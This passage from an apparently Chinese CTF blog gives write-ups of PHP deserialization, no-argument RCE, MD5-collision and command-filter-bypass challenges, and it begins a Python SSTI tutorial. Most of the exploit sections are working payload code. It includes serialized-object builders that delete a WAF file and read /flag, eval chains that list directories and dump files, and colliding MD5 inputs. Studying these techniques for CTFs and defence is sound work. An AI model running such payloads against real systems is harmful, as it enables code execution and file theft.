    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">login</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">register</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; login success you can to open shell file!</span></code></pre>
<p>exp获得shell.php内容</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span>  <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$register</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"shell"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">login</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">register</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// shell.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>exp利用内置类同名方法删除waf.txt</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span>  <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$register</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"waf.txt"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token constant">ZIPARCHIVE</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span><span class="token punctuation">;</span><span class="token shell-comment comment">#ZIPARCHIVE:::OVERWRITE是数值9</span>


    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">login</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">register</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>

<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>读取flag</p>
<pre><code>&lt;?php
class Game&#123;
    public  $username = &quot;admin&quot;;
    public  $password = &quot;admin&quot;;
    public  $choice;
    public  $register = &quot;admin&quot;;

    public  $file;
    public  $filename = &quot;waf.txt&quot;;
    public  $content = &#39;n\l /flag&#39;;#pr /flag


    public function __wakeup()&#123;

    &#125;
&#125;
class login&#123;
    public $file;
    public $filename;
    public $content;

&#125;
class register&#123;

&#125;
class Open&#123;

&#125;
$a = new Game();
$a-&gt;file = new Open();
echo base64_encode(serialize($a));
?&gt;</code></pre>
<pre><code>记录一下，获取类函数名的方法
&lt;?php
$classes = get_declared_classes();
foreach ($classes as $class) &#123;
    $methods = get_class_methods($class);
    foreach ($methods as $method) &#123;
        if (in_array($method, array(
            &#39;__destruct&#39;,
            &#39;__wakeup&#39;,
            &#39;__call&#39;,
            &#39;__callStatic&#39;,
            &#39;open&#39;
        ))) &#123;
            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
        &#125;
    &#125;
&#125;</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/23/%E6%97%A0%E5%8F%82RCE/">
                无参RCE
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-23</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>知识点：</p>
<p>#.git泄露</p>
<p>#无参RCE</p>
<p>函数知识：</p>
<pre><code>localeconv() 函数返回一包含本地数字及货币格式信息的数组，数组第一项就是`.`。
scandir() 列出指定目录中的文件和目录。
readfile() 输出一个文件。
current() 返回数组中的当前单元, 默认取第一个值。
pos() current() 的别名。
next() 函数将内部指针指向数组中的下一个元素，并输出。
array_reverse()以相反的元素顺序返回数组。
highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。
print_r 打印变量和var_dump类似但又有不同。</code></pre>
<h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="#0x01解题"></a>#0x01解题</h3><p>用dirmap扫描发现.git猜测是git文件泄露，再使用Git_Extract扫描。进行内容读取。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>
                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
            <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
        <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
<span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span>
<span class="token delimiter">?></span>
</code></pre>
<pre><code>#（?R)引用当前正则表达式，就是[a-z,_]+\((?R)?\)，就会递归下去，只能存在a(b(c(d())))这样的，不允许b(a(&#39;1&#39;))这样的。</code></pre>
<p>#第一步读取目录</p>
<pre><code>print_r(scandir(&#39;.&#39;));</code></pre>
<p>但中间的’.’不能输入进去，但localeconv()返回的数组第一个值就是.</p>
<p>current() 返回数组中的当前单元, 默认取第一个值。&lt;==&gt; pos()</p>
<p>构造</p>
<pre><code>print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));</code></pre>
<p><img src="/images/41.png"></p>
<p>#发现flag.php尝试读取。</p>
<p>array_reverse()以相反的元素顺序返回数组。</p>
<p>next() 函数将内部指针指向数组中的下一个元素，并输出。</p>
<p>构造</p>
<pre><code>print_r(next(array_reverse(scandir(current(localeconv())))));</code></pre>
<p><img src="/images/42.png"></p>
<p>#如何读取呢？</p>
<pre><code>file_get_contents()
readfile()
highlight_file()
show_source()</code></pre>
<pre><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>
<p>大佬的玄学方法：</p>
<p><img src="/images/43.png"></p>
<h4 id="文章参考："><a href="#文章参考：" class="headerlink" title="文章参考："></a>文章参考：</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/EC_Carrot/article/details/109483019?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161649970116780271570302%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161649970116780271570302&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-109483019.pc_search_result_cache&amp;utm_term=%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">https://blog.csdn.net/EC_Carrot/article/details/109483019?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161649970116780271570302%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161649970116780271570302&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-109483019.pc_search_result_cache&amp;utm_term=%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/">
                同时绕过强制类型和MD5
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-23</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="安洵杯-2019-web题-easy-web"><a href="#安洵杯-2019-web题-easy-web" class="headerlink" title="[安洵杯 2019] web题-easy_web"></a>[安洵杯 2019] web题-easy_web</h3><p>知识点：</p>
<p>MD5强绕过</p>
<p>shell的绕过方式</p>
<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
<pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
        echo `$cmd`;
    &#125;     “`”表示执行shell命令</code></pre>
<p>数组可以绕过MD5，但绕不过前面的强制类型转换，上面的方法是大佬想出来的，没看懂为啥。。。</p>
<p>#过滤了ls 但可以用dir</p>
<p>#过滤了cat 可以使用 ca\t 绕过或者 sort /flag</p>
<p>在shell命令里可以加\不影响执行</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">
                从一道题目浅谈SSTi
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-03-19</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h3 id="什么是模板-amp-模板注入SSTI-server-side-template-injection"><a href="#什么是模板-amp-模板注入SSTI-server-side-template-injection" class="headerlink" title="什么是模板&amp;模板注入SSTI(server-side template injection)"></a>什么是模板&amp;模板注入SSTI(server-side template injection)</h3><p>小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。</p>
<h3 id="Python-SSTI知识点"><a href="#Python-SSTI知识点" class="headerlink" title="Python SSTI知识点"></a>Python SSTI知识点</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
<ul>
<li><p><code>__class__</code></p>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
</li>
<li><p><code>__bases__</code></p>
<p>以元组的形式返回一个类所直接继承的类。</p>
</li>
<li><p><code>__base__</code></p>
<p>以字符串返回一个类所直接继承的类。</p>
</li>
<li><p><code>__mro__</code></p>
<p>返回解析方法调用的顺序。</p>
</li>
<li><p><code>__subclasses__()</code></p>
</li>
</ul>
<p>​       获取类的所有子类。</p>
<ul>
<li><p><strong><code>__init__</code></strong></p>
<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>
</li>
<li><p><strong><code>__globals__</code></strong></p>
<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>
<p><strong><code>__builtins__</code></strong></p>
<p><strong>在pyton2中为 <code>__builtins__</code> 和 <code>__builtin__</code></strong></p>
<p>这里 <code>__builtins__</code> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p>
<p>而 <code>__builtins__</code> 实际上是一个指向或者说引用 <code>__builtin__</code> 的（有点类似于软链接），而真正BIF在被定义时是在 <code>__builtin__</code> 模块中进行的。</p>
<p><strong>在python3中为 <code>__builtins__</code> 和 <code>builtins</code></strong></p>
